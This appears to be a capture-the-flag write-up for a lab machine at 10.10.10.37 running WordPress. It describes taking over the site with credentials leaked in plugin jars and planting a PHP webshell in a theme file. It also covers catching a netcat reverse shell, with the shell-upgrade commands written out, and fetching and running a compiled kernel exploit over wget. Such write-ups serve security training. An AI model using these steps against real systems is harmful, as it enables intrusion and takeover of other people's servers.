## Reconnaissance:
***
### Open Ports: 

- 21 - ProFTPD 1.3.5a
- 22 - OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
- 80 - Apache httpd 2.4.18 
***

## Enumeration:

***
**21** :  ProFTPD 1.3.5a - No avaiable exploit

**gobuster** : 10.10.10.37

- /wp-admin/
- /phpmyadmin/
- /plugins/

**http://10.10.10.37/** : wordpress site
wpscan: enumerate wordpress username and password
username: notch

**http://10.10.10.37/plugins/** : 2 jar files (blockycore, briefprevention)
jd-gui: sqluser, sqlpassword - phpmyadmin

**http://10.10.10.37/phpmyadmin/** : wpusers, update the hash password of notch

**http://10.10.10.37/wp-admin/** : notch and password
***

## Initial Foothold

***
WP-Themes-->Editor-->Themes-Footer.php : one liner php webshell to check if vulnerable

Visit Site and Give Command in the URL : Vulnerable :)

PHP Reverse Shell in PHP Webshell / start nc listener (use bash, issues on zsh)

Make the shell interactive : 

``` 
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols> 
```
**id** : www-data
***

## Privileges Escalation

***
**LinEnum** : Look for important & juicy files.

***

## Kernel Exploitation

***
**uname -a** : Kernel module version exploit 
Our system : / exploitdb / gcc exploit.c -o outputfile /
python -m SimpleHTTPServer 8000 --> wget://10.10.14.18/outputfile
Run the downloaded file.

***

# Resources: 
- http://scriptserver.mainframe8.com/wordpress_password_hasher.php
- https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-reverse-shell
- https://www.exploit-db.com/exploits/44298

----------------------------------------------------------------------------------------------------
